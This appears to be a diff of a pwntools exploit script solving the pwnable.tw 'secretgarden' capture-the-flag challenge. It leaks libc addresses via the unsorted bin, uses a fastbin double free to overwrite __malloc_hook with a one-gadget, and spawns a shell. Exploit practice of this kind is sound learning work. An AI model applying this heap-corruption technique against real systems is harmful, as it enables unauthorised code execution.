@@ -7,7 +7,6 @@ glibc 2.23 so no tcache or mitigations... yay
 2. overwrite __free_hook with one gadget
 3. call hook
 
-
 struct flower {
   int64_t is_alive;
   char* name;
@@ -15,11 +14,12 @@ struct flower {
 };
 """
 binary = ELF('secretgarden', checksec=0)
+lib_path = "/glibc/2.23/64/lib"
 libc = ELF('libc_64.so.6', checksec=0)
 if len(argv) >= 2 and argv[1] == '-r':
   p = remote('chall.pwnable.tw', 10203)
 else:
-  p = binary.process(env={})
+  p = process([lib_path+'/ld-2.23.so', './secretgarden'],env={'LD_PRELOAD':'libc_64.so.6'})
 s = lambda x, r="" : \
   p.sendafter(r, x) if r else p.send(x)
 sl = lambda x, r="" : \
@@ -48,15 +48,35 @@ def clean_garden():
 
 pause()
 
+# leak unsorted bin pointers
+# 0x410 outside of tcache bin field, im debugging on glibc 2.31
 raise_flower(0x410)
-raise_flower(0x20)
+raise_flower(0x60)
 raise_flower(0x410)
-raise_flower(0x20)
+raise_flower(0x60)
 remove_flower(0)
 remove_flower(2)
 raise_flower(0x410, b'C'*8, b'D'*8)
-arena_base = int.from_bytes(visit_garden().split(b'\n')[4][-6:], 'little')
+arena_base = int.from_bytes(visit_garden().split(b'\n')[4][-6:], 'little')-1096
+libc_base = arena_base - 0x3c3b20
+malloc_hook = libc_base + 0x3c3b10
 
 log.info("Arena base address: %#lx" % arena_base)
-p.interactive()
+log.info("Libc base address: %#lx" % libc_base)
+log.info("Malloc hook address: %#lx" % malloc_hook)
 
+# fastbin dup
+remove_flower(1)
+remove_flower(3)
+remove_flower(1)
+
+one_gadget = 0xef6c4
+raise_flower(0x90, b'freeme')
+raise_flower(0x60, p64(malloc_hook-0x23))
+raise_flower(0x60)
+raise_flower(0x60)
+raise_flower(0x60, b'A'*0x13+p64(one_gadget+libc_base))
+
+remove_flower(5)
+remove_flower(5)
+p.interactive()
